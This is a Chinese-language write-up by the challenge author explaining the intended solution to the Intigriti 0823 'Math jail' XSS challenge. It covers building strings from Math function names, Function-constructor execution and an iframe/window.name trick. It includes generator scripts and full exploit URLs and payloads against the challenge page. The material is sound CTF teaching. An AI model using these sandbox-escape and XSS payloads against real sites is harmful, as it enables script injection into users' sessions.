---
title: Intigriti 0823 挑戰 - Math jail 解法以及心得
catalog: true
date: 2023-08-29 14:10:44
tags: [Security]
categories: [Security]
photos: /img/intigriti-0823-author-writeup/cover.png
---

我在 Intigriti 的每月挑戰中出了一道 XSS 的題目，被我稱之為「Math jail」，連結如下：https://challenge-0823.intigriti.io/

而現在挑戰結束了，因此這篇文章就來講講出題的想法跟解法。 

<!-- more -->

Math jail 的構想來自於 Hack.lu CTF 2022 的一道題目，名為「Culinary Class Room」，那一題讓你在一個 Python class 上面加上許多 decorator，但是不能有參數，而目標是能執行任意程式碼。

decorator 其實也只是一個 function call，換句話說，就是你只能用以下這種形式的程式碼：`a(b(c(d(e(f())))))`，該怎麼做到能夠執行任何你想要的功能？

類似的題目也曾出現在中國的 CTF，像是這篇就有寫到：[PHP无参数RCE](https://xz.aliyun.com/t/9360)

而 Culinary Class Room 的解法是找到一個 list，往裡面 push 很多數字，最後轉成 bytes 然後丟到 eval 裡面去執行。

舉例來說，底下的程式碼會 push 112 這個數字到 `copyright._Printer__filenames`：

``` py
@copyright._Printer__filenames.append
@memoryview.__basicsize__.__sub__
@staticmethod.__basicsize__.__mul__
@object.__instancecheck__
class a:pass
```

當初看到這題以後，我就想說有沒有可能弄一個 JavaScript 的版本？於是 Math jail 就誕生了。

原本其實沒有限制一定要由 `Math.` 開頭，但後來發現這樣做比較有趣，而且如果不這樣做的話，直接 `alert(document.domain.toString())` 就結束了，要過濾掉很多關鍵字才能封住，而且還可能會有 unintended。

接下來就講一下 Math jail 解法大概的思路是什麼。

<!-- more -->

## 解法的整體概念

概念就跟前面提到的 Python 版本一樣，找一個 list 然後 push 東西進去，最後 join 然後拿去給 eval 執行，大概會像這樣：

``` js
var arr = []
eval(arr.join(''.toString(arr.push('a'.toString()))))
// Uncaught ReferenceError: a is not defined
```

上面的程式碼最後會執行 `a`，只要照著這個概念繼續做，就可以拼出 `alert()`，簡單舉個例子像是這樣：

``` js
var arr = ['a','l','e','r']
eval(
  arr.join(
    ''.toString(
        arr.push(
          ')'.toString(
            arr.push(
              '('.toString(
                arr.push('t'.toString())
              )
            )
          )
        )
      )
  )
)
```

因為我們每一個 function call 都不能有參數，所以像是 `arr.join('')` 這種的，可以改成 `arr.join(''.toString())`，就能夠符合規則。

有了這個基本概念以後，接下來的問題就可以分成幾個部分：

1. 怎麼找到一個可以用的陣列？
2. 怎麼找到想要的字元？
3. 怎麼 join？
4. 怎麼不用 eval 來執行？

## 1. 找到陣列

在題目中有特別給了一個陣列 `Math.seeds`，我們只要先 pop 就可以把它清空，像是這樣：

``` js
Math.seeds = [1,2,3,4]
Math.seeds.pop(Math.seeds.pop(Math.seeds.pop(Math.seeds.pop())))
console.log(Math.seeds) // []
```

如此一來，我們就有一個可以放東西的陣列能夠使用。

## 2. 找到想要的字元

首先，我們可以看看我們想要的字元是否存在於 `Math` 當中，例如說 `Math.abs.name` 就可以拿到 `"abs"` 這個字元，搭配 `at` 來使用的話，`Math.abs.name.at()` 就會是 `"a"`。

所以呢，`Math.seeds.push(Math.abs.name.at())`，就可以讓 `Math.seeds` 的內容變成 `["a"]`。

而 `Arrar.prototype.push` 的回傳值會是陣列的長度，因此目前是 1，所以如果能找到某個函式的第二個字是 l，就能減少函式呼叫的次數，是最好的方法。

講到這裡，你應該已經意識到這一題如果用手動的方式大概會累死，自動化會是更好的方式，因此就來寫個函式吧！

我們可以用遞迴的方式去尋找能接觸到的物件的每一個屬性是否符合我們想要的規則，並且回傳路徑是什麼，實作如下：

``` js
function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []

  findTarget(scope, initPath)

  // return the shortest one
  return result.sort((a, b) => a.length - b.length)[0]

  function findTarget(obj, path) {
    if(visited.has(obj)) return
    visited.add(obj)
    const list = Object.getOwnPropertyNames(obj)
    for(let key of list) {
      const item = obj[key]
      const newPath = path ? path + "." + key : key
      try {
        if (matchFn(item)) {
          result.push(newPath)
          continue
        }
      } catch(err){}
      
      if (item && typeof item === 'object') {
        findTarget(item, newPath)
      }
    }
  }
}
```

用的時候這樣用：

``` js
console.log(findTargetFromScope(Math, item => item.name.at(0) === 'a','Math'))
// Math.abs

console.log(findTargetFromScope(Math, item => item.name.at(1) === 'l','Math'))
// Math.clz32
```

也可以稍微整理一下，變這樣比較好用：

``` js
const findMathName = (index, char) => 
    findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')

console.log(findMathName(0, 'a')) // Math.abs
console.log(findMathName(1, 'l')) // Math.clz32
```

剛剛有說過我們會先嘗試拿陣列的長度去找對應的字元，那如果找不到怎麼辦呢？

我們可以再嘗試另外一種方式，那就是找固定的 index。

舉例來說，`Math.LN2` 是 `0.69`，而 `Array.prototype.at` 的參數如果是小數，會自動無條件捨去成整數，因此會變成 `0`。

所以，假設原本 `arr.push()` 回傳的是 2，我們只要在外面加上一層變成：`Math.LN2.valueOf(arr.push())`，就能讓現在的數字變回 0，就能用第 1 個字元去找我們想要的函式名稱。

像是這樣：

``` js
Math.seeds = []
Math.seeds.push(Math.log.name.at(Math.LN2.valueOf(Math.seeds.push(Math.abs.name.at()))))
```

就能讓陣列的內容變成 `['a', 'l']`。

以此類推，我們可以多準備一點 index，我準備了四個：

``` js
const mapping = [
  ['Math.LN2.valueOf'], // 0
  ['Math.LOG2E.valueOf'], // 1
  ['Math.E.valueOf'], // 2
  ['Math.PI.valueOf'], // 3
]
```

做到這邊，我們需要的英文字母應該都能找到了，那符號呢？像是 `()`，這該怎麼辦呢？

這時就需要回想起來有一個很好用的 [String.fromCharCode()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode)，只要給它數字，就能夠轉成字串。

要從 `Math` 存取到 `String` 也很簡單，先找到任何一個字串以後存取它的 constructor 就好：`Math.abs.name.constructor.fromCharCode`

於是接下來的問題就變成，那要怎麼產生數字？

都已經用 Math 了，那就寫一個搜尋的函式嘗試各種 Math 函式的組合吧！

``` js
function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
  return bfs(target)

  function bfs(target) {
    while(queue.length) {
      let [path, current] = queue.shift()
      for(let key of Object.getOwnPropertyNames(Math)){
        if (typeof Math[key] !== 'function') continue
        let value = Math[key]?.(current)
        if (value && !Number.isNaN(value)) {
          let newPath = [`Math.${key}`, ...path]
          if (value === target) {
            return newPath
          }

          if (newPath.length >= 10) return

          if (!visited.has(value)) {
            visited.add(value)
            queue.push([newPath, value])
          }
        }
      }
    }
  }
}
console.log(findTargetNumber(5, '('.charCodeAt(0)))
// ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']
```

當我們拼出 `alert` 時，最後一個 push 的回傳值會是 5，而 ( 的 ASCII code 是 40，我們只要這樣做就能得到 40：`Math.floor(Math.log2(Math.cosh(Math.clz32(5))))`

跟前面的程式碼拼接一下，就能得到 `(`：

``` js
Math.abs.name.constructor.fromCharCode(Math.floor(Math.log2(Math.cosh(Math.clz32(5)))))
```

把這些整合起來，就能組成一個有我們想要的字元的陣列。

## 3. 怎麼 join？

要把陣列 join 起來，我們需要找到空字串，才能把陣列變成我們想要的字串。

我一開始的想法是組出空白字元以後用 `" ".trim()`，但是空白字元也是經由別的函式拼出來的，會變成：`fn().trim()`，就違反了題目設定的規則。

幸好，還有另一種方式可以呼叫函式：`String.prototype.trim.call(" ")`，這樣也能拿到空字串。

我們可以利用前面找出 `(` 的方法找到空白字元，最後再加上這一連串的呼叫即可，範例如下：

``` js
// 假設我們已經有想要的陣列了
var arr = ['a','l','e','r','t','(',')']
console.log(
  arr.join(Math.abs.name.constructor.prototype.trim.call(Math.abs.name.constructor.fromCharCode(32)))
)
// alert()
```

## 4. 怎麼不用 eval 來執行？

除了 `eval` 以外，還有 function constructor 可以用，像是這樣：

``` js
Function('alert()')()
```

`Function` 的部分只要找到任何一個函式並且存取它的 constructor 即可：

``` js
Math.abs.constructor('alert()')()
```

那最後的 `()` 該怎麼辦呢？

跟剛剛一樣，我們可以用另一種方式呼叫函式，例如說 `alert.call()` 又可以寫成是 `Function.prototype.call.call(alert)`，因此我們要的程式碼如下：

``` js
Math.abs.constructor.call.call(Math.abs.constructor('alert()'))
```

## 5. 拼裝起來

我寫了一個 script 來產生程式碼，完整程式碼如下：

``` js
function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []

  findTarget(scope, initPath)

  // return the shortest one
  return result.sort((a, b) => a.length - b.length)[0]

  function findTarget(obj, path) {
    if(visited.has(obj)) return
    visited.add(obj)
    const list = Object.getOwnPropertyNames(obj)
    for(let key of list) {
      const item = obj[key]
      const newPath = path ? path + "." + key : key
      try {
        if (matchFn(item)) {
          result.push(newPath)
          continue
        }
      } catch(err){}
      
      if (item && typeof item === 'object') {
        findTarget(item, newPath)
      }
    }
  }
}

function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
  return bfs(target)

  function bfs(target) {
    while(queue.length) {
      let [path, current] = queue.shift()
      for(let key of Object.getOwnPropertyNames(Math)){
        if (typeof Math[key] !== 'function') continue
        let value = Math[key]?.(current)
        if (value && !Number.isNaN(value)) {
          let newPath = [`Math.${key}`, ...path]
          if (value === target) {
            return newPath
          }

          if (newPath.length >= 10) return

          if (!visited.has(value)) {
            visited.add(value)
            queue.push([newPath, value])
          }
        }
      }
    }
  }
}

function buildExploit(arrName, content) {
  let ans = []
  let currentIndex = 0
  let codeResult = ''

  for(let i=0; i<5; i++) {
    addFunction(`${arrName}.pop`)
  }

  const findMathName = (index, char) => 
    findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')
  
  for(let char of content) {

    // if we can find it in the Math for the current index, use it
    let result = findMathName(currentIndex, char)
    if (result) {
      addFunction(`${result}.name.at`)
      addFunction(`${arrName}.push`)
      currentIndex++
      continue
    }

    const mapping = [
      ['Math.LN2.valueOf'], // 0
      ['Math.LOG2E.valueOf'], // 1
      ['Math.E.valueOf'], // 2
      ['Math.PI.valueOf'], // 3
    ]

    // try to find Math.fn[i] == char
    let found = false
    for(let i=0; i<mapping.length; i++) {
      result = findMathName(i, char)
      if (result) {
        addFunction(mapping[i][0])
        addFunction(`${result}.name.at`)
        addFunction(`${arrName}.push`)
        currentIndex++
        found = true
        break
      }
    }

    if (found) {
      continue
    }

    // if we can't, we use integer to make a string
    let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0))
    mathResult.reverse() // remember to reverse cause the order
    for(let row of mathResult) {
      addFunction(row)
    }
    addFunction('Math.abs.name.constructor.fromCharCode')
    addFunction(`${arrName}.push`)
    currentIndex++
  }

  // add eval structure
  // generate space then trim
  let spaceResult = findTargetNumber(currentIndex, ' '.charCodeAt(0))
  spaceResult.reverse() // remember to reverse cause the order
  for(let row of spaceResult) {
    addFunction(row)
  }
  addFunction('Math.abs.name.constructor.fromCharCode')
  addFunction('Math.abs.name.constructor.prototype.trim.call')
  addFunction(`${arrName}.join`)
  addFunction('Math.abs.constructor')
  addFunction('Math.abs.constructor.prototype.call.call')

  return ans.reverse().join(',')
  //return codeResult

  function addFunction(name){
    ans.unshift(name)
    codeResult = `${name}(${codeResult})`
  }
}

console.log(buildExploit('Math.seeds', 'alert(document.domain)'))
```

最後產生的結果為：

``` js
Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
```

Exploit URL: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call

## Arbitrary XSS

上面的程式碼只是執行靜態的 `alert(document.domain)` 指令，那有可能執行任意的 JavaScript 程式碼嗎？

只要找到一個夠短的 payload，看起來就沒什麼問題。

例如說 `eval(location.hash.slice(1))` 雖然很短但還是有點長，如果用上面我提供的 script 去跑會卡住一下（因為我程式碼有些 bug），最後產生出一個長度 120 的結果，超過了 100。

但是另一個 payload `eval("'"+location)` 倒是沒問題，長度是 85：

https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#';alert(document.domain+'/arb-xss')

能夠達成執行任意程式碼以後，下一步就是盡可能找出最短的 operations。

## Code golf 時間

### 最短的 XSS payload

雖然說剛剛的 `eval("'"+location)` 已經很短了，但以這題來說，還有一個更短的 payload。

我從 @DrBrix 學到了可以用 `eval(parent.name)` 來縮短長度，而且這個技巧聰明地利用了 iframe。

在原本題目裡面有特別設置了 name，就是為了確保 name 不要被覆蓋，而  `https://challenge-0823.intigriti.io/` 這個頁面用 iframe 嵌入了 `chanllenge/index.html`，所以用 `parnent.name` 就可以存取到 `https://challenge-0823.intigriti.io/` 這個頁面的 name。

因此，@DrBrix 的策略是這樣的，首先我們有一個自己的頁面，就叫做 exp.html 好了，在 exp.html 裡面新增一個 iframe，先把 name 設成 payload，再把 location 替換成 `https://challenge-0823.intigriti.io`，如此一來結構就變成了：

```
- exp.html (top)
--- https://challenge-0823.intigriti.io (name: 'alert(1)')
------ https://challenge-0823.intigriti.io/challenge/index.html
```

接著就可以用 `frames[0].frames[0]` 存取到最底下的 iframe，並且把它跳轉到我們準備好的網址，變成這樣：

```
- exp.html (top)
--- https://challenge-0823.intigriti.io (name: 'alert(1)')
------ https://challenge-0823.intigriti.io/challenge/index.html?q=...
```

如此一來，就可以用 `parent.name` 存取到我們調整過的 name，程式碼如下：

``` html
<script>
setTimeout(() => {
frames[0].frames[0].location.replace('https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random')
},3000)</script>
<iframe srcdoc='

<script>
name = "alert(document.domain)"
document.location = "https://challenge-0823.intigriti.io/"
</script>
'>
</iframe>
```

`eval(parent.name)` 是我能找到最短的 payload，第二短的是 `location=parent.name`

### 清空 Math.seeds

之前是用 `Math.seeds.pop()` 來把內容清空，但其實這部分也可以再縮短！

@y0d3n 用了一個技巧是： `Math.seeds.splice(Math.imul())`

這是因為 `Math.imul()` 的回傳值是 0，而 `splice(0)` 的意思是：「刪除第 0 個元素以後的資料」，所以整個陣列都被清空了。

### 得到空字串

之前我自己是用了比較迂迴的方式產生空字串，但後來才發現其實用 `Math.random.name` 就可以得到空字串了。

之所以可以是因為這一段：

``` js
Math.random = function () {
  if (!this.seeds) {
    this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465]
    next = this.seeds[new Date().getTime() % this.seeds.length]
  }
  next = next * 1103515245 + 12345
  return (next / 65536) % 32767
}
```

注意這邊 `function` 後面沒有一個名稱，因此這個函式其實是匿名函式，所以我們是把一個匿名函式 assign 給 `Math.random`，因此 `Math.random.name` 就會是個空字串。

### 得到固定的數字

之前我是用 `Math.PI` 這種內建的常數來得到固定的數字，而我後來從 @Astrid 那邊發現了還可以用 `STRING.length.valueOf()` 這種形式來拿到數字。

舉例來說，`Math.isPrototypeOf.name.length.valueOf()` 就會是 13，利用這種方式可以更快地拿到一個固定的數字。

拿到固定數字以後，就可以以更短的步驟去找到我們想要的數字，而 @Astrid 甚至還寫了一段程式碼把最短路徑找出來。

### Final solution

最後產生出來的 payload 一共 59 個操作，會執行 `eval(parent.name)`，需要搭配前面講過的 iframe 才能執行：

```
Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
```

產生的腳本如下：

``` js
function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []

  findTarget(scope, initPath)

  // return the shortest one
  return result.sort((a, b) => a.length - b.length)[0]

  function findTarget(obj, path) {
    if(visited.has(obj)) return
    visited.add(obj)
    const list = Object.getOwnPropertyNames(obj)
    for(let key of list) {
      const item = obj[key]
      const newPath = path ? path + "." + key : key
      try {
        if (matchFn(item)) {
          result.push(newPath)
          continue
        }
      } catch(err){}
      
      if (item && typeof item === 'object') {
        findTarget(item, newPath)
      }
    }
  }
}

function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
  return bfs(target)

  function bfs(target) {
    while(queue.length) {
      let [path, current] = queue.shift()
      for(let key of Object.getOwnPropertyNames(Math)){
        if (typeof Math[key] !== 'function') continue
        let value = Math[key]?.(current)
        if (value && !Number.isNaN(value)) {
          let newPath = [`Math.${key}`, ...path]
          if (value === target) {
            return newPath
          }

          if (newPath.length >= 10) return

          if (!visited.has(value)) {
            visited.add(value)
            queue.push([newPath, value])
          }
        }
      }
    }
  }
}

function buildExploit(arrName, content) {
  let ans = []
  let currentIndex = 0
  let codeResult = ''

  // @credit: @y0d3n
  addFunction('Math.imul')
  addFunction('Math.seeds.splice')

  const findMathName = (index, char) =>  
    findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 'Math.abs.name.constructor') 
  
  for(let char of content) {
    console.log(char)

    // if we can find it in the Math for the current index, use it
    let result = findMathName(currentIndex, char)
    if (result) {
      addFunction(`${result}.name.at`)
      addFunction(`${arrName}.push`)
      currentIndex++
      continue
    }

    const mapping = [
      ['Math.LN2.valueOf'], // 0
      ['Math.LOG2E.valueOf'], // 1
      ['Math.E.valueOf'], // 2
      ['Math.PI.valueOf'], // 3
    ]

    // try to find Math.fn[i] == char
    let found = false
    for(let i=0; i<mapping.length; i++) {
      result = findMathName(i, char)
      if (char === 'v' && !result) {
        result = 'Math.LN2.valueOf'
      }
      if (result) {
        addFunction(mapping[i][0])
        addFunction(`${result}.name.at`)
        addFunction(`${arrName}.push`)
        currentIndex++
        found = true
        break
      }
    }

    if (found) {
      continue
    }

    // @credit: @Astrid
    if (char === '(') {
      addFunction('Math.isPrototypeOf.name.length.valueOf')
      addFunction('Math.log2')
      addFunction('Math.exp')
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    } else if (char === '.') {
      addFunction('Math.PI.valueOf')
      addFunction('Math.exp')
      addFunction('Math.acosh')
      addFunction('Math.exp')
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    } else {

      let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0))
      mathResult.reverse() // remember to reverse cause the order
      for(let row of mathResult) {
        addFunction(row)
      }
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    }
  }

  // add eval structure
  addFunction('Math.random.name.valueOf')
  addFunction(`${arrName}.join`)
  addFunction('Math.abs.constructor')
  addFunction('Math.abs.constructor.prototype.call.call')

  return ans.reverse()

  function addFunction(name){
    ans.unshift(name)
    codeResult = `${name}(${codeResult})`
  }
}

Math.seeds = []
// @credit: @DrBrix
const arr = buildExploit('Math.seeds', 'eval(parent.name)')
console.log('length:', arr.length)
console.log(arr.join(','))
```

或許還有更短的，但我懶得找了。

## 總結

以上就是 Math jail 的解法以及思考方式。

原本最理想的狀況是可以從 Math 就找到一個能用的陣列，就不需要 `Math.seeds`，不過我試了一下似乎是沒有找到，因此才出現這個比較突兀的東西。

我自己也從其他 hacker 們的解法中學習到很多，像是清空陣列或是更短的 payload 等等，都是我當初在設計題目時也沒有想到的，大家真的都很厲害。
